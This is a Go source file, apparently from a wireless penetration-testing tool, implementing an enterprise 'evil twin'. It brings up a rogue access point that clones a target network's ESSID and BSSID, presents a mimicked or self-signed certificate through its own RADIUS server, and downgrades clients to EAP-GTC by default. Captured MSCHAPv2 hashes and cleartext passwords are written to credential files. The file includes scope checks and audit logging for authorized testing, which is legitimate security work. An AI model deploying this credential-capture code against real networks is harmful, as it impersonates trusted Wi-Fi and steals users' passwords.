package daemon

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/waffl3ss/warp/internal/audit"
	"github.com/waffl3ss/warp/internal/eap/ap"
	"github.com/waffl3ss/warp/internal/eap/certs"
	"github.com/waffl3ss/warp/internal/eap/method"
	"github.com/waffl3ss/warp/internal/eap/radius"
	"github.com/waffl3ss/warp/internal/radio"
	"github.com/waffl3ss/warp/internal/radio/nl80211"
	"github.com/waffl3ss/warp/internal/rpc"
)

// The enterprise credential capture path.
//
// Three pieces run together and are started and stopped as one, because any of them alone is
// useless: an access point beaconing a scoped ESSID, WARP's RADIUS server behind it, and the
// EAP method server inside that. hostapd relays every EAP message untouched to the RADIUS
// server on localhost, so all the interesting logic stays in Go.
//
// The scope gate is asked once, before anything transmits, and it is asked with the ESSID -
// beaconing a name outside scope.txt impersonates a network the SoW never covered, which is
// the one thing the rogue AP must never do.

// CredsFile is where captured MSCHAPv2 lines are appended, inside the workspace's creds/.
const CredsFile = "mschapv2.5500"

// CleartextFile is where credentials captured with no cracking step (TTLS-PAP, EAP-GTC) are appended,
// inside creds/. It sits beside mschapv2.5500 so the enterprise deliverable is two self-contained
// files: hashes to crack, and passwords already in the clear. Tab-separated (ESSID, identity,
// password) so it maps back to the network without warp.db and survives a colon in a password.
const CleartextFile = "cleartext.txt"

// EAPSession is a running enterprise capture, as the frontends see it.
//
// Exported because it is the payload of an exported field on EAPStatus, which all three
// clients decode: an exported field whose type is unexported can be read but not constructed,
// which makes it awkward to test a frontend against and impossible to build a fixture for.
type EAPSession struct {
	ESSID   string    `json:"essid"`
	Channel int       `json:"channel"`
	RadioID string    `json:"radio_id"`
	Ifname  string    `json:"ifname"`
	Started time.Time `json:"started"`

	// CertSource says whether the presented certificate mimics a harvested one or is
	// self-signed. A supplicant that accepts a self-signed certificate is a more serious
	// finding than one that accepts a convincing mimic, so the report needs to know which.
	// BSSID is the address the rogue is wearing, empty when it kept the adapter's own.
	BSSID string `json:"bssid,omitempty"`

	CertSource  string `json:"certificate_source"`
	Fingerprint string `json:"certificate_fingerprint"`
	// CertID, CertSubject and CertIssuer identify exactly what went on the air. A report
	// saying a supplicant accepted "a certificate" is not a finding; saying it accepted one
	// claiming to be the client's own RADIUS server is.
	CertID      string `json:"certificate_id,omitempty"`
	CertSubject string `json:"certificate_subject,omitempty"`
	CertIssuer  string `json:"certificate_issuer,omitempty"`

	ap     ap.APController
	rad    *radius.Server
	handle *radio.Handle
	acq    *radio.Acquisition
	cancel context.CancelFunc
	done   chan struct{}
	// resumeCapture lifts the capture suspend placed on the rogue's card while it is in AP mode.
	// Held for the life of the session; called on teardown once the card is back in monitor.
	resumeCapture func()
}

// EAPStartParams selects the network to impersonate.
type EAPStartParams struct {
	// ESSID must be in scope. The gate refuses anything else.
	ESSID string `json:"essid"`
	// Channel to beacon on. Taken from the observed access point when omitted.
	Channel int `json:"channel,omitempty"`
	// AllowGTCDowngrade offers EAP-GTC when the supplicant Naks MSCHAPv2. GTC yields a
	// cleartext password with no cracking step, so a supplicant that accepts it is a much
	// more serious finding - and once the operator has started an enterprise capture they have
	// already committed to collecting credentials, so this is on by default. It is a pointer so
	// nil (the caller said nothing) means auto-enable; an explicit false opts out.
	AllowGTCDowngrade *bool `json:"allow_gtc_downgrade,omitempty"`

	// KeepOwnBSSID leaves the rogue on the adapter's own hardware address instead of the
	// target's.
	//
	// Off by default, because cloning is what makes the twin a twin. A client that has
	// associated to this network before remembers the BSSID as well as the name, and a great
	// many of them prefer - or restrict themselves to - the address they know. An access point
	// with the right ESSID and a stranger's BSSID reads as a *new* access point on a familiar
	// network, which is a materially weaker pretext and on some clients is no pretext at all.
	//
	// Reasons to turn it off: two BSSs with the same address on the same channel confuse
	// monitoring and some infrastructure, and a client site with 802.11r or a WIDS will see it
	// immediately. That is sometimes what you want and sometimes not.
	//
	// The address is one WARP observed broadcasting the scoped ESSID - discovered, never
	// configured. When several access points share the name, the operator may say which observed
	// one to wear by naming it here; empty means the strongest. See BSSID.
	KeepOwnBSSID bool `json:"keep_own_bssid,omitempty"`

	// BSSID optionally selects which observed access point the rogue mirrors, when more than one
	// broadcasts the scoped ESSID. It is validated against what WARP has actually seen on the air:
	// an address not observed broadcasting this ESSID is refused. This is selection among
	// discovered addresses, not configuration - invariant 1 forbids a *client-supplied* BSSID as
	// scope or as an arbitrary target, and this is neither: the ESSID still authorizes, and the
	// address must be one WARP discovered for it. Empty falls back to the strongest observed.
	BSSID string `json:"bssid,omitempty"`
	// Accept returns Access-Accept after capture instead of Access-Reject.
	//
	// Off by default: rejecting means the supplicant sees a failed login and is not placed on
	// a network it should not be on. Accepting is a deliberate choice for hostile-portal work.
	Accept bool `json:"accept,omitempty"`
}

// EAPStatus is what a frontend shows.
type EAPStatus struct {
	Running bool         `json:"running"`
	Session *EAPSession  `json:"session,omitempty"`
	Clients []ap.Client  `json:"clients,omitempty"`
	Stats   radius.Stats `json:"stats"`
	// Captured is every credential this daemon has taken, newest first.
	Captured []radius.Outcome `json:"captured,omitempty"`
	// CredsFile is where the 5500 lines are written, for the handoff.
	CredsFile string `json:"creds_file,omitempty"`
	// CleartextFile is where no-crack credentials (TTLS-PAP, GTC) are written.
	CleartextFile string `json:"cleartext_file,omitempty"`
}

// eapState is the daemon's live enterprise capture, if any.
type eapState struct {
	mu       sync.RWMutex
	session  *EAPSession
	captured []radius.Outcome
	// rejected tracks calling stations that have refused the certificate, so a client that retries
	// (Windows retries several times) raises one popup, not a stream of them. Every rejection is
	// still logged and counted; only the toast is deduplicated.
	rejected map[string]bool
}

func (d *Daemon) handleEAPStart(ctx context.Context, params json.RawMessage) (any, error) {
	var p EAPStartParams
	if len(params) > 0 {
		if err := json.Unmarshal(params, &p); err != nil {
			return nil, rpc.Errorf(rpc.CodeInvalidParams, "bad params: %v", err)
		}
	}
	if p.ESSID == "" {
		return nil, rpc.Errorf(rpc.CodeInvalidParams,
			"an ESSID is required: the rogue access point beacons exactly one scoped name")
	}

	d.eap.mu.Lock()
	if d.eap.session != nil {
		running := d.eap.session.ESSID
		d.eap.mu.Unlock()
		return nil, rpc.Errorf(rpc.CodeInvalidParams,
			"already impersonating %q - stop it before starting another", running)
	}
	d.eap.mu.Unlock()

	// The channel comes from the real network when it has been observed, so the rogue lands
	// where the clients already are rather than somewhere they will never look for it.
	channel := p.Channel
	if channel == 0 {
		for _, obs := range d.engine.Tracker().APs() {
			if obs.ESSID == p.ESSID && obs.Channel != 0 {
				channel = obs.Channel
				break
			}
		}
	}
	if channel == 0 {
		channel = 6
	}

	// Scope first, before anything is configured and long before anything transmits.
	if err := d.ws.Gate.AuthorizeBeacon(ctx, "rogue-ap", p.ESSID, channel, ""); err != nil {
		return nil, rpc.Errorf(rpc.CodeScopeDenied, "%v", err)
	}

	// The BSSID to wear. Discovered, never supplied: it is the address of an access point WARP
	// observed broadcasting this scoped name. The operator may pick which observed one (when the
	// name is on several), but an address WARP has not seen for this ESSID is refused - that keeps
	// it a choice among discovered addresses, not a hand-typed target (invariant 1).
	cloneBSSID := ""
	if !p.KeepOwnBSSID {
		if p.BSSID != "" {
			canon := d.observedBSSIDFor(p.ESSID, p.BSSID)
			if canon == "" {
				return nil, rpc.Errorf(rpc.CodeInvalidParams,
					"%s was not observed broadcasting %q. The rogue wears only a BSSID WARP has "+
						"discovered for the scoped network, never one supplied by hand - pick one "+
						"from the observed access points, or omit it for the strongest",
					p.BSSID, p.ESSID)
			}
			cloneBSSID = canon
		} else {
			cloneBSSID = d.strongestBSSIDFor(p.ESSID)
		}
	}

	handle, err := d.sched.Acquire(ctx, radio.RoleRogue)
	if err != nil {
		var unsat *radio.UnsatisfiableError
		if errors.As(err, &unsat) {
			return nil, rpc.Errorf(rpc.CodeUnsatisfiable, "%v", err)
		}
		return nil, err
	}

	sess, err := d.startEAP(ctx, p, channel, cloneBSSID, handle)
	if err != nil {
		handle.Release()
		return nil, err
	}
	return map[string]any{"session": sess}, nil
}

// startEAP brings up the certificate, the RADIUS server and the access point, in that order.
//
// Order matters: hostapd refuses to come up if its RADIUS backend is not answering, and a
// half-started access point beaconing with no authentication behind it would put a client on
// a network that cannot authenticate them.
func (d *Daemon) startEAP(ctx context.Context, p EAPStartParams, channel int, cloneBSSID string,
	handle *radio.Handle) (*EAPSession, error) {

	// The certificate the supplicant is asked to trust. A mimic of the real network's
	// certificate where one has been harvested; otherwise self-signed, which is a weaker
	// pretext and is recorded as such.
	chain, err := d.eapCertificate(p.ESSID)
	if err != nil {
		return nil, err
	}
	certSource := chain.entry.SourceDetail

	// The shared secret is written verbatim into hostapd.conf as
	// `auth_server_shared_secret=<secret>` and used as the HMAC key on both ends. It must be
	// printable: 16 raw random bytes routinely contain a newline, a null, a '#' or an '=', any
	// of which truncates or corrupts that config line so hostapd ends up keyed differently from
	// the server - and then every Message-Authenticator fails and the rogue authenticates nobody.
	// Hex encoding keeps it to [0-9a-f], safe in the config and still 128 bits of entropy.
	rawSecret := make([]byte, 16)
	if _, err := rand.Read(rawSecret); err != nil {
		return nil, fmt.Errorf("daemon: generate RADIUS secret: %w", err)
	}
	secret := []byte(hex.EncodeToString(rawSecret))

	sess := &EAPSession{
		ESSID: p.ESSID, Channel: channel,
		RadioID: handle.Device.ID, Ifname: handle.Device.Ifname,
		Started: time.Now(), CertSource: certSource, BSSID: cloneBSSID,
		Fingerprint: chain.entry.Fingerprint,
		CertID:      chain.entry.ID,
		CertSubject: chain.entry.Subject,
		CertIssuer:  chain.entry.Issuer,
		handle:      handle,
		done:        make(chan struct{}),
	}

	// GTC downgrade is automatic: on unless the caller explicitly opted out. Nothing is lost by
	// offering it - a supplicant that refuses GTC simply falls through to the MSCHAPv2 challenge
	// WARP captures anyway; one that accepts hands over a cleartext password with no cracking step.
	gtc := p.AllowGTCDowngrade == nil || *p.AllowGTCDowngrade

	rad, err := radius.New(radius.Config{
		Secret: secret,
		ESSID:  p.ESSID,
		EAP: method.ServerConfig{
			TLS:               chain.tls,
			ESSID:             p.ESSID,
			AllowGTCDowngrade: gtc,
			Accept:            p.Accept,
		},
		OnOutcome: d.onEAPOutcome,
		Log:       d.log,
	})
	if err != nil {
		return nil, err
	}
	sess.rad = rad

	// The session's lifetime is the daemon's, not this RPC call's: a client disconnecting
	// must not tear down a running capture.
	runCtx, cancel := context.WithCancel(d.ctx)
	sess.cancel = cancel

	go func() {
		if err := rad.ListenAndServe(runCtx); err != nil && runCtx.Err() == nil {
			d.log.Error("RADIUS server stopped", "err", err)
			d.Broadcast(rpc.Event{
				Kind: "eap", Level: rpc.LevelWarn,
				Text: fmt.Sprintf("[!] RADIUS server stopped: %v", err),
			})
		}
	}()

	// Suspend the capture loop on this card for the life of the rogue. AP mode reconfigures the
	// interface, and a recon capture loop left running on it would thrash reopening a monitor
	// socket that AP mode has taken away - the "capture interrupted / reopened" storm. Keyed by
	// radio ID, so if the rogue is on a dedicated card this is a harmless no-op. On a borrowed
	// capture card, recon on that card pauses for the session; a second adapter keeps capturing.
	sess.resumeCapture = d.engine.SuspendCapture(handle.Device.ID)

	acq, err := acquireReconciling(runCtx, d.sched, d.acquirer, handle.Device, nl80211.IftypeAP)
	if err != nil {
		sess.resumeCapture()
		cancel()
		return nil, err
	}
	sess.acq = acq

	hwMode := "g"
	if channel > 14 {
		hwMode = "a"
	}
	controller := ap.NewHostapd(d.ws.Path("captures"), d.log)
	sess.ap = controller

	if err := controller.Start(runCtx, ap.Config{
		Interface:    handle.Device.Ifname,
		ESSID:        p.ESSID,
		Channel:      channel,
		RADIUSAddr:   "127.0.0.1",
		RADIUSPort:   radius.DefaultPort,
		RADIUSSecret: string(secret),
		HWMode:       hwMode,
		// Wear the target's address. See EAPStartParams.KeepOwnBSSID.
		BSSID: cloneBSSID,
	}); err != nil {
		cancel()
		d.acquirer.Release(context.Background(), acq)
		sess.resumeCapture()
		return nil, fmt.Errorf("daemon: rogue access point failed to start: %w", err)
	}

	go d.pumpAPEvents(runCtx, controller, sess)

	d.eap.mu.Lock()
	d.eap.session = sess
	d.eap.rejected = map[string]bool{} // fresh per session, so the per-client toast dedup resets
	d.eap.mu.Unlock()

	d.logEvent(audit.KindTransmit, audit.OutcomeAllow,
		"enterprise credential capture started", map[string]any{
			"essid": p.ESSID, "channel": channel, "radio_id": handle.Device.ID,
			"certificate_source":   sess.CertSource,
			"certificate_sha256":   sess.Fingerprint,
			"gtc_downgrade":        gtc,
			"accept_after_capture": p.Accept,
		})

	d.Broadcast(rpc.Event{
		Kind: "eap", Level: rpc.LevelGood,
		Text: fmt.Sprintf("[+] impersonating %q on ch%d (%s) - certificate %s",
			p.ESSID, channel, handle.Device.Ifname, sess.CertSource),
		Fields: map[string]any{
			"essid": p.ESSID, "channel": channel, "certificate": sess.CertSource,
		},
	})
	return sess, nil
}

// eapChain is a certificate ready to serve, plus where it came from.
type eapChain struct {
	entry certs.Entry
	tls   *tls.Config
}

// eapCertificate resolves the certificate the supplicant is asked to trust.
//
// The library decides, not this function: whatever the operator selected for this ESSID goes
// on the air, and the library falls back to the strongest thing it holds when the selection is
// stale. Only when the library holds nothing at all is a self-signed certificate generated -
// and it is filed, so it appears in the listing as the weak pretext it is rather than as an
// invisible default.
func (d *Daemon) eapCertificate(essid string) (*eapChain, error) {
	lib := d.certs()

	if entry, pair, ok := lib.Selected(essid); ok {
		return &eapChain{entry: entry, tls: tlsConfigFor(pair)}, nil
	}

	// Nothing prepared. A rogue that will not come up because nobody generated a certificate
	// is worse than one that comes up with a weak pretext and says so on every screen.
	entry, err := lib.AddSelfSigned(essid)
	if err != nil {
		return nil, fmt.Errorf("daemon: generate a certificate for %q: %w", essid, err)
	}
	_, pair, ok := lib.Selected(essid)
	if !ok {
		return nil, fmt.Errorf("daemon: generated a certificate for %q but could not load it", essid)
	}
	return &eapChain{entry: entry, tls: tlsConfigFor(pair)}, nil
}

// observedBSSIDFor returns the canonical address of the access point WARP has observed broadcasting
// essid whose BSSID matches the supplied one (case-insensitively), or "" when none does.
//
// It is how the rogue's chosen BSSID is validated: the operator may pick which observed access point
// to mirror, but only one WARP has actually seen on the air for this scoped name - an address typed
// by hand, or one belonging to a different network, is refused. That keeps BSSID selection a choice
// among discovered addresses rather than configuration (invariant 1).
func (d *Daemon) observedBSSIDFor(essid, bssid string) string {
	want := strings.ToLower(strings.TrimSpace(bssid))
	if want == "" {
		return ""
	}
	for _, ap := range d.engine.Tracker().APsForESSID(essid) {
		if strings.ToLower(ap.BSSID.String()) == want {
			return ap.BSSID.String()
		}
	}
	return ""
}

// strongestBSSIDFor returns the address of the observed access point broadcasting essid with
// the best signal.
//
// Strongest rather than first: on an estate with a dozen access points on one name, the one the
// local clients are actually associated to is the one they can hear, and that is the address
// worth wearing. Returns "" when nothing has been observed - the rogue then keeps the
// adapter's own address, which is a weaker pretext and is reported as such.
func (d *Daemon) strongestBSSIDFor(essid string) string {
	best := ""
	var bestRSSI int8
	seen := false

	for _, ap := range d.engine.Tracker().APsForESSID(essid) {
		if !ap.HasRSSI {
			if best == "" {
				best = ap.BSSID.String()
			}
			continue
		}
		if !seen || ap.BestRSSI > bestRSSI {
			best, bestRSSI, seen = ap.BSSID.String(), ap.BestRSSI, true
		}
	}
	return best
}

// certs returns the engagement's certificate library.
func (d *Daemon) certs() *certs.Store { return certs.Open(d.ws.Path("certs")) }

func tlsConfigFor(pair tls.Certificate) *tls.Config {
	return &tls.Config{
		Certificates: []tls.Certificate{pair},
		MinVersion:   tls.VersionTLS10, // supplicants in the field are old
	}
}

// sanitiseFilename makes an ESSID safe to use as a path component. A network name is
// attacker-controlled text off the air and may contain slashes, dots or control characters.
func sanitiseFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9',
			r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	if b.Len() == 0 {
		return "unnamed"
	}
	return b.String()
}

// pumpAPEvents forwards what the access point reports to the operator.
func (d *Daemon) pumpAPEvents(ctx context.Context, c ap.APController, sess *EAPSession) {
	defer close(sess.done)

	for {
		select {
		case <-ctx.Done():
			return
		case ev, ok := <-c.Events():
			if !ok {
				return
			}
			level := rpc.LevelInfo
			if ev.Kind == ap.EventError {
				level = rpc.LevelWarn
			}
			if ev.Kind == ap.EventClientJoin || ev.Kind == ap.EventEAPStarted {
				level = rpc.LevelGood
			}
			d.Broadcast(rpc.Event{
				Kind: "eap", Level: level,
				Text:   "[*] " + ev.Text,
				Fields: map[string]any{"essid": sess.ESSID, "mac": ev.MAC, "event": ev.Kind},
			})
		}
	}
}

// onEAPOutcome records one completed authentication attempt.
//
// Called from the RADIUS server for every attempt, successful or not. A failed attempt is
// still evidence - it says a supplicant tried, and what it was willing to negotiate.
func (d *Daemon) onEAPOutcome(o radius.Outcome) {
	// Only an actual credential goes in the captured list.
	//
	// A certificate refusal is an outcome too, but it is a *pass* for the client and there is
	// nothing to crack - appending it made the Evil Twin tab read "1 captured, 1 refused" for
	// a supplicant that captured nothing and refused the cert, which is the opposite of what
	// happened. Refusals are counted in the RADIUS stats (CertRefused); the captured list is
	// credentials only.
	if o.HashLine != "" || o.Cleartext != "" {
		d.eap.mu.Lock()
		d.eap.captured = append([]radius.Outcome{o}, d.eap.captured...)
		d.eap.mu.Unlock()
	}

	if o.HashLine != "" {
		if err := d.appendCredential(o.HashLine); err != nil {
			d.log.Error("credential write failed", "err", err)
		}
	}
	if o.Cleartext != "" {
		if err := d.appendCleartext(o.ESSID, identityOf(o), o.Cleartext); err != nil {
			d.log.Error("cleartext credential write failed", "err", err)
		}
	}

	// Refresh the consolidated, always-current credentials summary when a real credential lands.
	if o.HashLine != "" || o.Cleartext != "" {
		d.writeCredentialsFile()
	}

	detail := map[string]any{
		"essid":           o.ESSID,
		"outer_identity":  o.OuterIdentity,
		"inner_identity":  o.InnerIdentity,
		"method":          o.Method.String(),
		"calling_station": o.CallingStation,
	}
	d.logEvent(audit.KindTransmit, audit.OutcomeInfo, "enterprise credential attempt", detail)

	switch {
	case o.Cleartext != "":
		// No cracking step at all. This is the most serious outcome the module produces.
		d.Broadcast(rpc.Event{
			Kind: "eap", Level: rpc.LevelWarn,
			Text: fmt.Sprintf("[!] CLEARTEXT PASSWORD  %s  (%s) → creds/%s - no cracking required",
				identityOf(o), o.Method, CleartextFile),
			Fields: detail,
		})
	case o.HashLine != "":
		d.Broadcast(rpc.Event{
			Kind: "eap", Level: rpc.LevelGood,
			Text: fmt.Sprintf("[+] MSCHAPv2  %s  → creds/%s (hashcat -m 5500)",
				identityOf(o), CredsFile),
			Fields: detail,
		})
	case o.CertificateRejected():
		// The supplicant validated the certificate and refused it - a PASS for that client, not a
		// WARP failure and not a finding. It is worth telling the operator so they can note the
		// client is correctly configured. Toast once per station (Windows retries), log every time.
		who := o.CallingStation
		if who == "" {
			who = "a supplicant"
		}
		d.eap.mu.Lock()
		if d.eap.rejected == nil {
			d.eap.rejected = map[string]bool{}
		}
		firstForStation := !d.eap.rejected[o.CallingStation]
		d.eap.rejected[o.CallingStation] = true
		d.eap.mu.Unlock()

		level := rpc.LevelInfo // logged only, no toast, on a retry
		if firstForStation {
			level = rpc.LevelWarn // first refusal from this client: a toast so the operator sees it
		}
		d.Broadcast(rpc.Event{
			Kind: "eap", Level: level,
			Text: fmt.Sprintf("[*] %s rejected the certificate - the client validates correctly, "+
				"no credential captured", who),
			Fields: detail,
		})
	default:
		d.Broadcast(rpc.Event{
			Kind: "eap", Level: rpc.LevelInfo,
			Text: fmt.Sprintf("[*] %s attempted %s, no credential captured",
				identityOf(o), o.Method),
			Fields: detail,
		})
	}
}

func identityOf(o radius.Outcome) string {
	if o.InnerIdentity != "" {
		return o.InnerIdentity
	}
	if o.OuterIdentity != "" {
		return o.OuterIdentity
	}
	return "<no identity>"
}

// appendCredential writes one 5500 line, immediately and fsynced.
//
// Same rule as the 22000 files: the box may be powered off at any moment, and a buffered
// credential is a lost credential that cannot be recaptured.
func (d *Daemon) appendCredential(line string) error {
	dir := d.ws.Path("creds")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return fmt.Errorf("daemon: create creds directory: %w", err)
	}

	f, err := os.OpenFile(filepath.Join(dir, CredsFile),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return fmt.Errorf("daemon: open credential file: %w", err)
	}
	defer f.Close()

	if _, err := f.WriteString(line + "\n"); err != nil {
		return fmt.Errorf("daemon: append credential: %w", err)
	}
	return f.Sync()
}

// appendCleartext writes one no-crack credential line to creds/cleartext.txt, immediately and
// fsynced, for the same reason appendCredential does: a buffered credential lost to a power-off
// cannot be recaptured. Tab-separated (ESSID, identity, password) and self-contained.
func (d *Daemon) appendCleartext(essid, identity, password string) error {
	dir := d.ws.Path("creds")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return fmt.Errorf("daemon: create creds directory: %w", err)
	}
	// Guard the separator and newlines: a tab or newline in a field would corrupt the line and
	// every field after it. Replace rather than drop, so the value is still legible.
	clean := func(s string) string {
		return strings.NewReplacer("\t", " ", "\n", " ", "\r", " ").Replace(s)
	}
	f, err := os.OpenFile(filepath.Join(dir, CleartextFile),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return fmt.Errorf("daemon: open cleartext credential file: %w", err)
	}
	defer f.Close()

	line := clean(essid) + "\t" + clean(identity) + "\t" + clean(password) + "\n"
	if _, err := f.WriteString(line); err != nil {
		return fmt.Errorf("daemon: append cleartext credential: %w", err)
	}
	return f.Sync()
}

func (d *Daemon) handleEAPStop(ctx context.Context, _ json.RawMessage) (any, error) {
	d.eap.mu.Lock()
	sess := d.eap.session
	d.eap.session = nil
	d.eap.mu.Unlock()

	if sess == nil {
		return nil, rpc.Errorf(rpc.CodeInvalidParams, "no enterprise capture is running")
	}
	d.stopEAPSession(ctx, sess)

	d.logEvent(audit.KindLifecycle, audit.OutcomeInfo, "enterprise credential capture stopped",
		map[string]any{"essid": sess.ESSID})
	d.Broadcast(rpc.Event{
		Kind: "eap", Level: rpc.LevelInfo,
		Text: fmt.Sprintf("[*] stopped impersonating %q", sess.ESSID),
	})
	return map[string]any{"running": false, "essid": sess.ESSID}, nil
}

// stopEAPSession tears everything down, best effort, in reverse order of starting.
//
// Every step runs regardless of an earlier failure: a partial teardown that leaves hostapd
// holding the adapter strands it in AP mode, which is exactly what invariant 4's clean
// teardown rule exists to prevent.
func (d *Daemon) stopEAPSession(ctx context.Context, sess *EAPSession) {
	if sess.ap != nil {
		if err := sess.ap.Stop(ctx); err != nil {
			d.log.Error("rogue access point teardown was incomplete", "err", err)
		}
	}
	if sess.cancel != nil {
		sess.cancel()
	}
	if sess.acq != nil {
		if err := d.acquirer.Release(context.Background(), sess.acq); err != nil {
			d.log.Error("radio release was incomplete", "err", err)
		}
	}
	// Lift the capture suspend only after the card is back in monitor, so recon reopens on a
	// restored interface rather than racing the AP-mode teardown. Safe to call more than once.
	if sess.resumeCapture != nil {
		sess.resumeCapture()
	}
	if sess.handle != nil {
		sess.handle.Release()
	}
}

func (d *Daemon) handleEAPStatus(context.Context, json.RawMessage) (any, error) {
	d.eap.mu.RLock()
	sess := d.eap.session
	captured := append([]radius.Outcome(nil), d.eap.captured...)
	d.eap.mu.RUnlock()

	res := EAPStatus{
		Running:       sess != nil,
		Session:       sess,
		Captured:      captured,
		CredsFile:     d.ws.Path("creds", CredsFile),
		CleartextFile: d.ws.Path("creds", CleartextFile),
	}
	if sess != nil {
		res.Clients = sess.ap.Clients()
		res.Stats = sess.rad.Stats()
	}
	return res, nil
}
